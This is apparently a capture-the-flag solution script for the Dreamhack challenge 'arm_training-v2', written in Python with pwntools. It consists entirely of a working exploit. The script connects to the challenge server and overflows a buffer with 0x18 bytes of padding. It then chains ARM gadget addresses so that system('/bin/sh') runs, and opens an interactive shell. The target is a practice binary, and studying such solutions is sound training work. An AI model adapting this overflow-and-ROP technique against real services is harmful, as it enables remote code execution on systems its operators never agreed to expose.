from pwn import *

p = remote('host1.dreamhack.games',  18466)
elf = ELF('./arm_training-v2')

payload = b'a' * 0x18

pop_r3_pc = 0x10608
binsh = 0x106a4
mov_r0_r3_bl_system = 0x10598

payload += p32(pop_r3_pc) + p32(binsh) + p32(mov_r0_r3_bl_system)

p.send(payload)

p.interactive()
